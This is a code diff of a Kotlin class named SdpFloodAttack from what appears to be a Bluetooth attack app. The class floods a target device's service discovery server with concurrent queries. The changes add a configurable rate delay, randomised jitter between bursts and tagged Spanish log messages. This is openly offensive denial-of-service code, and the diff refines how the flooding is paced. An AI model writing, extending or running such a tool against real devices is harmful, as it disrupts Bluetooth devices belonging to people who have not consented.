@@ -16,7 +16,11 @@ import kotlinx.coroutines.launch
  * SDP Query Storm: repeatedly triggers service discovery (SDP) against the
  * target to saturate its SDP server with queries.
  */
-class SdpFloodAttack(private val targetAddress: String, private val threads: Int = 8) : BluetoothAttack {
+class SdpFloodAttack(
+    private val targetAddress: String,
+    private val threads: Int = 8,
+    private val rateDelayMs: Int = 0
+) : BluetoothAttack {
 
     override val displayName = AttackType.SDP_FLOOD.displayName
     override val description = AttackType.SDP_FLOOD.description
@@ -45,7 +49,7 @@ class SdpFloodAttack(private val targetAddress: String, private val threads: Int
 
         val concurrency = threads.coerceIn(1, 16)
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-        onLog("SDP Query Storm iniciado (objetivo $targetAddress, concurrencia $concurrency)")
+        onLog("[SDP] Query Storm iniciado (objetivo $targetAddress, concurrencia $concurrency)")
         scope!!.launch {
             var total = 0
             while (isActive && running) {
@@ -56,10 +60,10 @@ class SdpFloodAttack(private val targetAddress: String, private val threads: Int
                     }
                 }
                 jobs.forEach { it.join() }
-                if (total % 50 == 0) onLog("Consultas SDP enviadas: $total")
-                delay(200)
+                if (total % 50 == 0) onLog("[SDP] Consultas SDP enviadas: $total")
+                jitterDelay(maxOf(200, rateDelayMs))
             }
-            onLog("SDP Query Storm detenido ($total consultas enviadas)")
+            onLog("[SDP] Query Storm detenido ($total consultas enviadas)")
         }
     }
 
